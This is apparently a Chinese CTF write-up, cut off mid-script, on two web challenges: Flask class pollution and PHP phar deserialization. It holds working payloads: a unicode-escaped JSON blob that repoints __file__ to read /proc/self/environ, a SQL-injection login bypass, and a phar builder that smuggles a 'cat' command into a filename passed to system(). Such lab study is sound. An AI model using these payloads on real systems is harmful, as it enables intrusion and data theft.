class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>大致看一眼 经典的python原型链污染 当时做的时候也成功登录了 </p><p>但是我不知道污染哪里这个题目 应该是我没见过的知识点</p><h2 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h2><p>其实最重要的一部分我反而没有看到 qwq </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p><code>__file__</code>：当前脚本运行的路径 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690183448142-533651ff-d59d-4e33-bf8a-4321a2d79b19.png" alt="img"></p><p>这里我们如果能污染__file__值 那么我们就可以读取任意文件了</p><p>还有就是这题开了pin 而且还有个<code>/console</code>路由 这是咋发现的真离谱</p><p>然后是黑名单waf了<code>__init__</code></p><p>在check()之后是进行了一次json.loads的，而json识别unicode  所以可以用unicode编码进行bypass</p><p>预期解就是利用任意文件读取然后计算pin码 就可以getshell了</p><p>这里就不赘述了</p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>真正学习的是非预期</p><p>这里有两种payload:</p><h3 id="第一种：污染-file-任意文件读取"><a href="#第一种：污染-file-任意文件读取" class="headerlink" title="第一种：污染__**file__**任意文件读取"></a>第一种：污染__**file__**任意文件读取</h3><p>前面也说过原理了 只要我们将__file__污染为我们想读取的文件名即可</p><p>直接读环境变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/self/environ&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184393793-d0a681ee-d952-4ce1-a399-3b4569f5cfef.png" alt="img"></p><p>然后访问<code>/proc/1/environ</code> 出题人环境变量中的flag忘删了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184461558-65c4f6b7-4253-4e53-8b18-fb8274dba2d4.png" alt="img"></p><h3 id="第二种-污染-static-folder-路径穿越"><a href="#第二种-污染-static-folder-路径穿越" class="headerlink" title="第二种: 污染 _static_folder  路径穿越"></a>第二种: 污染 _static_folder  路径穿越</h3><p>首先来看看<code> _static_folder</code> </p><p>flask init文件部分代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        import_name,</span></span><br><span class="line"><span class="params">        static_url_path=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        static_folder=<span class="string">&#x27;static&#x27;</span>,</span></span><br><span class="line"><span class="params">        static_host=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        host_matching=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        subdomain_matching=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        template_folder=<span class="string">&#x27;templates&#x27;</span>,</span></span><br><span class="line"><span class="params">        instance_path=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        instance_relative_config=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        root_path=<span class="literal">None</span></span></span><br><span class="line"><span class="params">    </span>):</span><br></pre></td></tr></table></figure><p>可以看到<code>static_folder=&#39;static&#39;</code> 默认是在static文件也即是默认的静态文件的位置  </p><p>我的理解是 我们<code>static_folder</code>可以指定静态文件的位置 并且我们可以访问 一般我们做题都有注意到我们可以访问static目录 </p><p>那么 如果我们污染<code>_static_folder</code>让他的路径为<code>/</code> 那么我们是不是可以根目录下的所有文件了 </p><p>因此我们就可以路径穿越了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690185307308-a0208406-53ea-4081-b105-873fc05a2830.png" alt="img"></p><p>注意一下路径<code>/static/proc/1/environ</code></p><h1 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h1><p>这道题目 如何上传文件的同时并且post数据 我尬住了 不太会 额额额 抽象</p><p>然后赛后看了师傅们的wp 真的太强辣</p><p>首先用户名存在万能钥匙登录 <code>admin&#39; or 1=1#</code> 就可以登录了 </p><p>然后存在源码泄露<code>/y0u_cant_find_1t.zip</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>源码逻辑也比较清楚 我寄在了怎么一边上传文件一边post传参</p><p>根据源码逻辑 我们先要登录成功 然后才能上传文件 所以post传参和发包同时弄 我不太会 </p><p>因为这个题目登录成功之后还会退出来 不会留在上传文件的页面 所以我们要手动发包 我只会用现成的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>所以就寄了 </p><p>赛后看师傅们的wp 是用py脚本的发的 真的太强了</p><p>然后这道题目最明显的就是 FILE类的析构函数存在一个命令执行漏洞然后就能想到是phar反序列化了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么一般我们phar反序列化还要配合能够触发反序列化的文件操作函数才行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284296888-8b13e482-f7af-4f9f-9692-14afbbc72175.png" alt="img"></p><p>看了下这道题目源码没有这些函数 但是这次又学到一个函数就是md5_file()</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284418928-34e41ed9-ef4a-46b1-9611-bca266194f9f.png" alt="img"></p><p>在源码这个地方 如果我们提交get参数 file和todo 那么他将会将我们的文件进行md5_file()后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p>那么phar反序列化能够搭配的函数又多了一个qwq</p><p>所以思路明确 先phar生成一个包含我们恶意序列化的图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span 